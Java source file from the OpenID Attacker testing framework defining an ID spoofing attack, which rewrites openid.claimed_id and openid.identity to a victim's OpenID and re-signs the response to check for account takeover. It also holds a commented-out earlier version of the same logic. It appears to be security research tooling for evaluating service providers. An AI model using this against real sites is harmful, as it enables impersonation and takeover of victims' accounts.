/*
 * OpenID Attacker
 * (C) 2015 Christian Mainka & Christian Koßmann
 *
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 *
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 *
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult;
import wsattacker.sso.openid.attacker.evaluation.attack.Attack;
import wsattacker.sso.openid.attacker.evaluation.attack.AbstractAttack;
import java.util.ArrayList;
import java.util.List;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameterKeeper;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.controller.ServerController;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;

public class IdSpoofingAttack extends AbstractAttack {

    public IdSpoofingAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
    
    @Attack
    private AttackResult performIdSpoofingAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        // determine whether claimed_id or identity is used by the Service Provider
        
        /* ========== claimed_id ========== */
        AttackParameter claimedIdParameter = keeper.getParameter("openid.claimed_id");
        claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
        claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        claimedIdParameter.setAttackMethod(HttpMethod.GET);
        claimedIdParameter.setAttackValue("http://www.rub.de");
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);

        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        boolean isClaimedIdUsed = loginResult.getAuthenticatedUser() != ServiceProvider.User.ATTACKER;
        
        /* ========== identity ========== */
        keeper.resetAllParameters();
        
        AttackParameter identityParameter = keeper.getParameter("openid.identity");
        identityParameter.setAttackValueUsedForSignatureComputation(true);
        identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        identityParameter.setAttackMethod(HttpMethod.GET);
        identityParameter.setAttackValue("http://www.rub.de");
        
        // include modified parameter in signature
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);

        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        boolean isIdentityUsed = loginResult.getAuthenticatedUser() != ServiceProvider.User.ATTACKER;
        
        keeper.resetAllParameters();
        
        String description = "";
        if (isClaimedIdUsed && isIdentityUsed) {
            description = "openid.claimed_id and openid.identity are set to the victim's OpenID.";
            claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
            claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            claimedIdParameter.setAttackMethod(HttpMethod.GET);
            claimedIdParameter.setAttackValue(serviceProvider.getVictimOpenId());
            
            identityParameter.setAttackValueUsedForSignatureComputation(true);
            identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            identityParameter.setAttackMethod(HttpMethod.GET);
            identityParameter.setAttackValue(serviceProvider.getVictimOpenId());
        } else if (isClaimedIdUsed) {
            description = "openid.claimed_id is set to the victim's OpenID (openid.identity is not used).";
            claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
            claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            claimedIdParameter.setAttackMethod(HttpMethod.GET);
            claimedIdParameter.setAttackValue(serviceProvider.getVictimOpenId());
        } else if (isIdentityUsed) {
            description = "openid.identity is set to the victim's OpenID (openid.claimed_id is not used).";
            identityParameter.setAttackValueUsedForSignatureComputation(true);
            identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            identityParameter.setAttackMethod(HttpMethod.GET);
            identityParameter.setAttackValue(serviceProvider.getVictimOpenId());
        }
        
        // include modified parameter in signature
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.VICTIM;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult(description, loginResult, result, interpretation);
    }
    

    /*@Override
    public List<AttackResult> performAttacks() {
        List<AttackResult> attackResults = new ArrayList<>();
        
        ServerController controller = new ServerController();
        AttackParameterKeeper keeper = controller.getServer().getParameterConfiguration();
        keeper.resetAllParameters();
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        // determine whether claimed_id or identity is used by the Service Provider
        
        /* ========== claimed_id ========== */
        /*AttackParameter claimedIdParameter = keeper.getParameter("openid.claimed_id");
        claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
        claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        claimedIdParameter.setAttackMethod(HttpMethod.GET);
        claimedIdParameter.setAttackValue("http://www.rub.de");
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);

        boolean isClaimedIdUsed = loginResult.getAuthenticatedUser() == ServiceProvider.User.NONE;
        Interpretation interpretation = isClaimedIdUsed ? Interpretation.NEUTRAL : Interpretation.RESTRICTED;
        
        attackResults.add(new AttackResult("claimed id is used", loginResult, isClaimedIdUsed, AttackResult.Interpretation.NEUTRAL));
        
        /* ========== identity ========== */
        /*keeper.resetAllParameters();
        
        AttackParameter identityParameter = keeper.getParameter("openid.identity");
        identityParameter.setAttackValueUsedForSignatureComputation(true);
        identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        identityParameter.setAttackMethod(HttpMethod.GET);
        identityParameter.setAttackValue("http://www.rub.de");
        
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);

        boolean isIdentityUsed = loginResult.getAuthenticatedUser() == ServiceProvider.User.NONE;
        interpretation = isIdentityUsed ? Interpretation.RESTRICTED : Interpretation.NEUTRAL;
        
        if (isClaimedIdUsed && isIdentityUsed) {
            interpretation = Interpretation.NEUTRAL;
        }
        attackResults.add(new AttackResult("identity is used", loginResult, isIdentityUsed, interpretation));
        
        keeper.resetAllParameters();
        
        if (isClaimedIdUsed && isIdentityUsed) {
            claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
            claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            claimedIdParameter.setAttackMethod(HttpMethod.GET);
            claimedIdParameter.setAttackValue(serviceProvider.getVictimOpenId());
            
            identityParameter.setAttackValueUsedForSignatureComputation(true);
            identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            identityParameter.setAttackMethod(HttpMethod.GET);
            identityParameter.setAttackValue(serviceProvider.getVictimOpenId());
        } else if (isClaimedIdUsed) {
            claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
            claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            claimedIdParameter.setAttackMethod(HttpMethod.GET);
            claimedIdParameter.setAttackValue(serviceProvider.getVictimOpenId());
        } else if (isIdentityUsed) {
            identityParameter.setAttackValueUsedForSignatureComputation(true);
            identityParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
            identityParameter.setAttackMethod(HttpMethod.GET);
            identityParameter.setAttackValue(serviceProvider.getVictimOpenId());
        }
        
        loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.ATTACKER);
        
        boolean success = loginResult.getAuthenticatedUser() == ServiceProvider.User.VICTIM;
        interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        attackResults.add(new AttackResult("ID Spoofing attack possible", loginResult, success, interpretation));
        
        return attackResults;
    } */   

    
}
